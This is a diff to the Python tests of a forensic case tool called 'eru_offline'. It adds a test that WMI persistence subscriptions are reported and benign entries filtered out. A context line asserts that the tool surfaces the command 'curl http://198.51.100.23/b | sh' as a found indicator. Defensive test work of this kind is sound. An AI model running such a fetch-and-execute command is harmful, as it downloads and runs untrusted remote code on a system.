@@ -1,4 +1,5 @@
 """Eru's offline answers, read from an Elrond case directory (src/web/backend/eru_offline.py)."""
+import json
 import sys
 from pathlib import Path
 
@@ -38,6 +39,21 @@ def test_case_answers(tmp_path):
     assert "curl http://198.51.100.23/b | sh" in eru_offline.answer("commands", path)
     assert "198.51.100.23 (×2)" in eru_offline.answer("iocs", path)
     assert "found nothing" in eru_offline.answer("analysis", path)
+
+
+def test_wmi_subscriptions(tmp_path):
+    host = tmp_path / "CASE02" / "LAB-WIN11"
+    cooked = host / "artefacts" / "cooked"
+    cooked.mkdir(parents=True)
+    (cooked / "wbem.json").write_text(json.dumps([
+        {"filter_name": "LabUpdaterFilter", "consumer_class": "CommandLineEventConsumer",
+         "consumer_name": "LabUpdaterConsumer", "consumer_values": ["cmd.exe /c exit 0"]},
+        {"filter_name": "SCM Event Log Filter", "consumer_class": "NTEventLogEventConsumer",
+         "consumer_name": "SCM Event Log Consumer", "consumer_values": [], "note": "likely benign: SCM"},
+    ]))
+    persistence = eru_offline.answer("persistence", str(tmp_path / "CASE02"))
+    assert "LabUpdaterFilter -> CommandLineEventConsumer 'LabUpdaterConsumer': cmd.exe /c exit 0" in persistence
+    assert "SCM Event Log" not in persistence
 
 
 def test_general_and_missing_case():
